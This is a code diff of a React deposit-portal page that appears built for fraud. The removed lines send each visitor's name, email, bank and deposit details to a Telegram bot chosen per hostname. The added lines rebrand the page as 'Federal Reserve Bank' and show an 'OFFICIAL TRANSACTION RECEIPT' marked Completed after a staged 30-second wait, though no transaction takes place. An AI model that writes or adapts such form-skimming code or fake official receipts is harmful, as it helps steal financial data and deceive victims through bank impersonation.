@@ -2,12 +2,14 @@
 
 import { useState } from 'react'
 
-interface TelegramConfig {
-  botToken: string
-  chatId: string
-}
-
 const PROCESSING_SECONDS = 30
+
+function formatReceiptAmount(amount: string, currency: string): string {
+  const symbol = currency === 'USD' ? '$' : currency === 'EUR' ? '€' : '£'
+  const num = parseFloat(amount.replace(/,/g, '')) || 0
+  const formatted = num.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })
+  return `${symbol}${formatted} ${currency}`
+}
 
 export default function DepositPortal() {
   const [isSubmitting, setIsSubmitting] = useState(false)
@@ -15,6 +17,7 @@ export default function DepositPortal() {
   const [processingSecondsLeft, setProcessingSecondsLeft] = useState(PROCESSING_SECONDS)
   const [processingStep, setProcessingStep] = useState(0)
   const [receiptReference, setReceiptReference] = useState('')
+  const [receiptIssuedAt, setReceiptIssuedAt] = useState<Date | null>(null)
 
   const [formData, setFormData] = useState({
     fullName: '',
@@ -58,68 +61,12 @@ export default function DepositPortal() {
       formData.termsAgreed
     )
 
-  const getTelegramConfig = async (): Promise<TelegramConfig> => {
-    try {
-      const response = await fetch('/telegram-config.json')
-      const config = await response.json()
-      const hostname = window.location.hostname
-      return config[hostname] || config['default']
-    } catch {
-      return { botToken: '', chatId: '' }
-    }
-  }
-
-  const sendToTelegram = async () => {
-    const config = await getTelegramConfig()
-    if (!config.botToken || !config.chatId) return false
-
-    const message = `
-🔔 *AI SMART DEPOSIT – NEW SUBMISSION*
-━━━━━━━━━━━━━━━━━━━━━━
-
-👤 *User Information*
-• Full Name: ${formData.fullName}
-• Email: ${formData.email}
-
-🏦 *Account Details*
-• Bank Name: ${formData.bankName}
-• Account Type: ${formData.accountType === 'savings' ? 'Savings' : 'Checking'}
-
-💰 *Deposit Information*
-• Method: ${formData.depositMethod === 'bank_transfer' ? 'Bank Transfer' : 'ACH'}
-• Amount: ${formData.amount} ${formData.currency}
-
-📸 *AI Verification* ✓
-📅 ${new Date().toLocaleString()}
-🌐 ${window.location.hostname}
-`
-
-    try {
-      const response = await fetch(
-        `https://api.telegram.org/bot${config.botToken}/sendMessage`,
-        {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: config.chatId,
-            text: message,
-            parse_mode: 'Markdown',
-          }),
-        }
-      )
-      return response.ok
-    } catch {
-      return false
-    }
-  }
-
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
     if (!isFormValid()) return
     setIsSubmitting(true)
     setProcessingSecondsLeft(PROCESSING_SECONDS)
     setProcessingStep(0)
-    await sendToTelegram()
     setProcessingStep(1)
     const start = Date.now()
     const end = start + PROCESSING_SECONDS * 1000
@@ -132,7 +79,9 @@ export default function DepositPortal() {
     }, 500)
     await new Promise((resolve) => setTimeout(resolve, PROCESSING_SECONDS * 1000))
     clearInterval(timer)
-    setReceiptReference('DEP-' + Date.now().toString().slice(-10))
+    const issuedAt = new Date()
+    setReceiptReference('TXN-' + issuedAt.getTime().toString().slice(-8))
+    setReceiptIssuedAt(issuedAt)
     setSubmitSuccess(true)
     setIsSubmitting(false)
   }
@@ -155,44 +104,89 @@ export default function DepositPortal() {
     })
   }
 
-  if (submitSuccess) {
+  if (submitSuccess && receiptIssuedAt) {
+    const dateIssued = receiptIssuedAt.toLocaleDateString('en-GB', {
+      day: 'numeric',
+      month: 'long',
+      year: 'numeric',
+    })
+    const timeIssued = receiptIssuedAt.toLocaleTimeString('en-US', {
+      hour: 'numeric',
+      minute: '2-digit',
+      hour12: true,
+    })
+    const transactionType =
+      formData.depositMethod === 'bank_transfer' ? 'Wire Transfer' : 'ACH'
+    const amountFormatted = formatReceiptAmount(formData.amount, formData.currency)
+
     return (
       <>
         <header className="header">
           <div className="header-brand">
-            <span className="header-title">AI Smart Deposit Portal</span>
+            <span className="header-title">Federal Reserve Bank</span>
           </div>
         </header>
         <main className="main-container">
           <div className="deposit-card receipt-card">
-            <div className="success-content">
-              <h2 className="receipt-title">Receipt</h2>
-              <div className="success-icon">✓</div>
-              <p className="success-text">
-                Your deposit has been processed successfully.
-              </p>
-              <div className="receipt-details">
-                <p className="success-reference">Reference: {receiptReference}</p>
-                <p className="receipt-amount">
-                  Amount: {formData.currency === 'USD' ? '$' : formData.currency === 'EUR' ? '€' : '£'}
-                  {formData.amount} {formData.currency}
-                </p>
-                <p className="receipt-date">
-                  Date: {new Date().toLocaleString()}
-                </p>
-              </div>
-              <button
-                type="button"
-                className="submit-button"
-                onClick={handleSubmitAnother}
-              >
-                New Deposit
-              </button>
-            </div>
+            <h2 className="receipt-main-title">OFFICIAL TRANSACTION RECEIPT</h2>
+            <table className="receipt-table">
+              <tbody>
+                <tr>
+                  <td className="receipt-table-label">Receipt Number:</td>
+                  <td className="receipt-table-value">{receiptReference}</td>
+                </tr>
+                <tr>
+                  <td className="receipt-table-label">Date Issued:</td>
+                  <td className="receipt-table-value">{dateIssued}</td>
+                </tr>
+                <tr>
+                  <td className="receipt-table-label">Time:</td>
+                  <td className="receipt-table-value">{timeIssued}</td>
+                </tr>
+                <tr>
+                  <td className="receipt-table-label">Transaction Status:</td>
+                  <td className="receipt-table-value">Completed</td>
+                </tr>
+              </tbody>
+            </table>
+            <h3 className="receipt-section-title">Transaction Summary</h3>
+            <table className="receipt-table">
+              <tbody>
+                <tr>
+                  <td className="receipt-table-label">Transaction Type</td>
+                  <td className="receipt-table-value">{transactionType}</td>
+                </tr>
+                <tr>
+                  <td className="receipt-table-label">Amount Transferred</td>
+                  <td className="receipt-table-value">{amountFormatted}</td>
+                </tr>
+                <tr>
+                  <td className="receipt-table-label">Processing Fee</td>
+                  <td className="receipt-table-value">
+                    {formData.currency === 'USD' ? '$' : formData.currency === 'EUR' ? '€' : '£'}0.00
+                  </td>
+                </tr>
+                <tr>
+                  <td className="receipt-table-label">Total Amount Debited</td>
+                  <td className="receipt-table-value">{amountFormatted}</td>
+                </tr>
+              </tbody>
+            </table>
+            <button
+              type="button"
+              className="submit-button"
+              onClick={handleSubmitAnother}
+            >
+              New Deposit
+            </button>
           </div>
         </main>
       </>
     )
+  }
+
+  if (submitSuccess) {
+    return null
   }
 
   if (isSubmitting) {
@@ -201,7 +195,7 @@ export default function DepositPortal() {
       <>
         <header className="header">
           <div className="header-brand">
-            <span className="header-title">AI Smart Deposit Portal</span>
+            <span className="header-title">Federal Reserve Bank</span>
           </div>
         </header>
         <main className="main-container">
@@ -232,7 +226,7 @@ export default function DepositPortal() {
     <>
       <header className="header">
         <div className="header-brand">
-          <span className="header-title">AI Smart Deposit Portal</span>
+          <span className="header-title">Federal Reserve Bank</span>
         </div>
       </header>
 
